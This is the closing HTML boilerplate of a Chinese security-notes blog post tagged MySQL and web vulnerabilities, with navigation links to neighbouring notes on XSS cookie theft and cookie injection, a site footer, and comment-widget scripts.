        <img src="/assets/images/reward/images/paypal.png" alt="57uv6Z6g 贝宝">
        <span>贝宝</span>
      </div>

  </div>
</div>

          <div class="post-tags">
              <a href="/tags/MySQL/" rel="tag"># MySQL</a>
              <a href="/tags/WebVulnerabilities/" rel="tag"># WebVulnerabilities</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2020/03/27/%E9%80%9A%E8%BF%87XSS%E6%8B%BF%E5%88%B0%E7%BD%91%E7%AB%99cookie/" rel="prev" title="【笔记】通过XSS拿到网站cookie">
                  <i class="fa fa-angle-left"></i> 【笔记】通过XSS拿到网站cookie
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2020/03/28/Cookie%E6%B3%A8%E5%85%A5/" rel="next" title="【笔记】Cookie 注入">
                  【笔记】Cookie 注入 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






    <div class="comments"><div id="twikoo-comments"></div></div>
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2019 – 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">57uv6Z6g</span>
  </div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>
<div id="site-time"></div>


<div id="current-visitors-count"></div>


<div id="site-badge"></div>


<div id="loading-door-left"></div>
<div id="loading-door-right"></div>
<a id="loading-door-a" href="javascript:loadingDoorOpen();">芝麻开门</a>


<div id="waifu">
  <div id="waifu-tips"></div>
  <canvas id="live2d" width="800" height="800"></canvas>
</div>
<div id="waifu-toggle">
  <span>看板娘</span>
</div>


<link rel="stylesheet" href="/dist/bundle.css">


<script src="/dist/bundle.js"></script>


    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>
<script class="next-config" data-name="twikoo" type="application/json">{"enable":true,"visitor":false,"envId":"https://twikoo.loli.fj.cn","jsUrl":"https://unpkg.com/twikoo@1.6.44/dist/twikoo.min.js","el":"#twikoo-comments"}</script>
<script>
document.addEventListener('page:loaded', () => {
  NexT.utils.loadComments(CONFIG.twikoo.el)
    .then(() => NexT.utils.getScript(
      CONFIG.twikoo.jsUrl || 'https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js',
      { condition: window.twikoo }
    ))
    .then(() => {
      twikoo.init(CONFIG.twikoo);
    });
});
</script>
<style>
.post-block, .comments {
  overflow: visible;
}
.tk-owo-emotion {
  display: inline-block;
}
</style>

</body>
</html>
